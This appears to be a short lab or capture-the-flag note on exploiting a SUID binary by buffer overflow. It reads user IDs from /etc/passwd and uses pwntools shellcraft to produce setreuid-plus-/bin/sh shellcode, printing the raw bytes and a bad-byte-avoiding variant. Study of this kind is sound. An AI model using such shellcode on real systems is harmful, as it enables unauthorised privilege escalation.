
As what we want to exploit is the executables suid permission we need to set the uid in the shellcode we run. 

[[../../../Tools n Info/27 - asm, Buffer Overflow, debug/Buffer Overflow/11 - SUID binaries|11 - SUID binaries]]

For this we need the users uid from /etc/passwd:
```sh
...
reynard:x:1000:1000:Reynard,,,:/home/reynard:/bin/bash
anansi:x:1001:1001:Anansi,,,:/home/anansi:/bin/bash
puck:x:1002:1002:Puck,,,:/home/puck:/bin/bash
```

We will use pwntools shellcraft functionality to get the code we need:
```sh
┌──(kali㉿kali)-[~/bof]
└─$ pwn shellcraft --format d amd64.linux.setreuid 1001 + amd64.linux.sh
\x31\xff\x66\xbf\xe9\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05
```

This gives us the shellcode to use later.


`pwn shellcraft --format d --avoid "\x00\x46" amd64.linux.setreuid 1001 + amd64.linux.sh`